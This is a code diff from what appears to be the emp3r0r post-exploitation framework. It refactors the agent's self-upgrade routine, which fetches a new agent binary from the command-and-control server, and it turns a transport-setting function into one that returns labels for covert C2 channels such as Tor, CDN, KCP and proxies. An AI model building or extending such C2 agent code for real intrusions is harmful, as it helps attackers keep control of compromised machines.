@@ -11,8 +11,8 @@ import (
 	"os/exec"
 	"strings"
 
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/ftp"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
@@ -68,7 +68,7 @@ func IsAgentAlive(c net.Conn) bool {
 // Upgrade agent from https://ccAddress/agent
 func Upgrade(checksum string) (out string) {
 	tempfile := common.RuntimeConfig.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
-	_, err := ftp.SmartDownload("", "agent", tempfile, checksum)
+	_, err := c2transport.SmartDownload("", "agent", tempfile, checksum)
 	if err != nil {
 		return fmt.Sprintf("Error: Download agent: %v", err)
 	}
@@ -91,17 +91,14 @@ func Upgrade(checksum string) (out string) {
 }
 
 // set C2Transport string
-func SetC2Transport() {
+func GenC2TransportString() (transport_str string) {
 	if transport.IsTor(def.CCAddress) {
-		def.Transport = fmt.Sprintf("TOR (%s)", def.CCAddress)
-		return
+		return fmt.Sprintf("TOR (%s)", def.CCAddress)
 	} else if common.RuntimeConfig.CDNProxy != "" {
-		def.Transport = fmt.Sprintf("CDN (%s)", common.RuntimeConfig.CDNProxy)
-		return
+		return fmt.Sprintf("CDN (%s)", common.RuntimeConfig.CDNProxy)
 	} else if common.RuntimeConfig.UseKCP {
-		def.Transport = fmt.Sprintf("KCP (%s)",
+		return fmt.Sprintf("KCP (%s)",
 			def.CCAddress)
-		return
 	} else if common.RuntimeConfig.C2TransportProxy != "" {
 		// parse proxy url
 		proxyURL, err := url.Parse(common.RuntimeConfig.C2TransportProxy)
@@ -111,17 +108,14 @@ func SetC2Transport() {
 
 		// if the proxy port is emp3r0r proxy server's port
 		if proxyURL.Port() == common.RuntimeConfig.AgentSocksServerPort && proxyURL.Hostname() == "127.0.0.1" {
-			def.Transport = fmt.Sprintf("Reverse Proxy: %s", common.RuntimeConfig.C2TransportProxy)
-			return
+			return fmt.Sprintf("Reverse Proxy: %s", common.RuntimeConfig.C2TransportProxy)
 		}
 		if proxyURL.Port() == common.RuntimeConfig.ShadowsocksLocalSocksPort && proxyURL.Hostname() == "127.0.0.1" {
-			def.Transport = fmt.Sprintf("Auto Proxy: %s", common.RuntimeConfig.C2TransportProxy)
-			return
+			return fmt.Sprintf("Auto Proxy: %s", common.RuntimeConfig.C2TransportProxy)
 		}
 
-		def.Transport = fmt.Sprintf("Proxy %s", common.RuntimeConfig.C2TransportProxy)
-		return
+		return fmt.Sprintf("Proxy %s", common.RuntimeConfig.C2TransportProxy)
 	} else {
-		def.Transport = fmt.Sprintf("HTTP2 (%s)", def.CCAddress)
+		return fmt.Sprintf("HTTP2 (%s)", def.CCAddress)
 	}
 }
